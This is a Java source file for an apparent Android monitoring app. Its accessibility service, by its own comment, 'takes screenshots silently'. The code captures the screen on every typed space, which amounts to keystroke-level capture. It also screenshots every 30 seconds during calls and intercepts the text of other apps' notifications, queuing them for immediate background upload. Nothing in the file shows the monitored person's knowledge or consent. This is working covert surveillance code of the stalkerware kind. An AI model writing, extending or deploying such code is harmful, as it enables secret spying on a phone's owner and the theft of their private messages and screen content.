package com.tracker.app.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.util.Log;
import android.content.Context;
import android.view.Display;
import android.view.KeyEvent;
import android.os.PowerManager;
import android.view.accessibility.AccessibilityEvent;
import android.app.Notification;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;
import java.util.function.Consumer;
import com.tracker.app.jobs.UploadJobService;

/**
 * AccessibilityService that listens for global key events and takes screenshots silently.
 */
public class SpacebarAccessibilityService extends AccessibilityService {

    private static final String TAG = "SpacebarService";
    public static SpacebarAccessibilityService instance;
    public static Runnable onSpacebarPressed;

    // Call screenshot tracking
    private Timer callTimer;
    private final List<File> callScreenshots = new ArrayList<>();
    private final List<Long> callCapturedTimes = new ArrayList<>();
    private String currentCallSessionId;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
                | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);

        Log.d(TAG, "Spacebar Accessibility Service connected");
        MonitoringForegroundService.startServicesIfNeeded(this);
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN && event.getKeyCode() == KeyEvent.KEYCODE_SPACE) {
            Log.d(TAG, "SPACEBAR PRESSED - triggering screenshot");
            if (onSpacebarPressed != null) {
                onSpacebarPressed.run();
            }
            return false;
        }
        return super.onKeyEvent(event);
    }

    /**
     * Silent Screenshot Capture via AccessibilityService (Android 11+)
     */
    public void takeSilentScreenshot(Consumer<File> onCaptured) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult result) {
                    try {
                        HardwareBuffer buffer = result.getHardwareBuffer();
                        ColorSpace colorSpace = result.getColorSpace();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                        
                        File file = saveAsWebP(bitmap);
                        bitmap.recycle();
                        buffer.close();

                        if (onCaptured != null) onCaptured.accept(file);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to process screenshot", e);
                        if (onCaptured != null) onCaptured.accept(null);
                    }
                }

                @Override
                public void onFailure(int errorCode) {
                    Log.e(TAG, "Accessibility Screenshot failed with code: " + errorCode);
                    if (onCaptured != null) onCaptured.accept(null);
                }
            });
        } else {
            Log.e(TAG, "Silent screenshot requires Android 11+");
            if (onCaptured != null) onCaptured.accept(null);
        }
    }

    /**
     * Call Screenshot Logic
     */
    public void startCallScreenshots(String source) {
        currentCallSessionId = UUID.randomUUID().toString();
        callScreenshots.clear();
        callCapturedTimes.clear();

        Log.d(TAG, "Starting call screenshots for: " + source + " (session: " + currentCallSessionId + ")");

        callTimer = new Timer();
        callTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {

                takeSilentScreenshot(file -> {
                    if (file != null) {
                        synchronized (callScreenshots) {
                            callScreenshots.add(file);
                            callCapturedTimes.add(System.currentTimeMillis());
                        }
                        Log.d(TAG, "Call screenshot " + callScreenshots.size() + " captured");
                    }
                });
            }
        }, 0, 30000);
    }

    public CallScreenshotResult stopCallScreenshots() {
        if (callTimer != null) {
            callTimer.cancel();
            callTimer = null;
        }

        CallScreenshotResult result = new CallScreenshotResult(
                new ArrayList<>(callScreenshots),
                new ArrayList<>(callCapturedTimes),
                currentCallSessionId != null ? currentCallSessionId : ""
        );

        Log.d(TAG, "Call screenshots stopped. Total: " + result.files.size());

        callScreenshots.clear();
        callCapturedTimes.clear();
        currentCallSessionId = null;

        return result;
    }

    private File saveAsWebP(Bitmap bitmap) {
        File dir = new File(getCacheDir(), "screenshots");
        dir.mkdirs();

        File file = new File(dir, "scr_" + System.currentTimeMillis() + ".webp");
        try (FileOutputStream out = new FileOutputStream(file)) {
            bitmap.compress(Bitmap.CompressFormat.WEBP, 40, out);
            out.flush();
        } catch (Exception e) {
            Log.e(TAG, "Error saving screenshot: " + e.getMessage());
        }

        Log.d(TAG, "Screenshot saved: " + file.getAbsolutePath());
        return file;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        MonitoringForegroundService.startServicesIfNeeded(this);
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            int addedCount = event.getAddedCount();
            int fromIndex = event.getFromIndex();
            
            if (addedCount > 0) {
                List<CharSequence> texts = event.getText();
                if (texts != null && !texts.isEmpty()) {
                    CharSequence newText = texts.get(0);
                    if (newText != null && fromIndex >= 0 && (fromIndex + addedCount) <= newText.length()) {
                        CharSequence addedString = newText.subSequence(fromIndex, fromIndex + addedCount);
                        if (addedString.toString().contains(" ")) {
                            Log.d(TAG, "Space (soft keyboard) typed - triggering screenshot");
                            if (onSpacebarPressed != null) {
                                  onSpacebarPressed.run();
                            }
                        }
                    }
                }
            }
        } else if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            try {
                CharSequence pkg = event.getPackageName();
                if (pkg == null) return;
                
                String packageName = pkg.toString();
                // Exclude our own notification
                if (packageName.equals(getPackageName())) return;
                
                if (event.getParcelableData() instanceof Notification) {
                    Notification notification = (Notification) event.getParcelableData();
                    if (notification.extras != null) {
                        CharSequence titleChar = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
                        CharSequence textChar = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
                        
                        String title = titleChar != null ? titleChar.toString() : "";
                        String body = textChar != null ? textChar.toString() : "";
                        
                        // Fallback to tickerText if body is empty
                        if (body.isEmpty() && notification.tickerText != null) {
                            body = notification.tickerText.toString();
                        }
                        
                        // Ignore empty notifications
                        if (title.isEmpty() && body.isEmpty()) return;
                        
                        Log.d(TAG, "Notification intercepted: " + packageName + " | Title: " + title);
                        UploadQueue.addNotification(packageName, title, body, System.currentTimeMillis());
                        
                        // Trigger upload immediately in the background
                        UploadJobService.triggerNow(getApplicationContext());
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error parsing notification", e);
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }

    @Override
    public void onDestroy() {
        if (callTimer != null) callTimer.cancel();
        instance = null;
        super.onDestroy();
    }

    public static class CallScreenshotResult {
        public final List<File> files;
        public final List<Long> capturedTimes;
        public final String sessionId;

        public CallScreenshotResult(List<File> files, List<Long> capturedTimes, String sessionId) {
            this.files = files;
            this.capturedTimes = capturedTimes;
            this.sessionId = sessionId;
        }
    }
}
